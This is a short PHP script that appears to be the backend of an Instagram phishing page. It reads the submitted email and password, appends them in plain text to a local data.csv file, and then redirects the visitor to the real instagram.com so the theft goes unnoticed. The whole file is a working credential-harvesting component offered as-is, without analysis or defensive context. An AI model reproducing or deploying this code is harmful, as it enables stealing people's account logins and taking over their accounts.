<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $data1 = $_POST['email'];
    $data2 = $_POST['password'];
    
    $csvFile = 'data.csv';
    $csvData = array($data1, $data2);
    
    $file = fopen($csvFile, 'a'); 
    fputcsv($file, $csvData);
    fclose($file); 

    // Redirect to Instagram page
    header('Location: https://www.instagram.com');
    exit();
}
?>
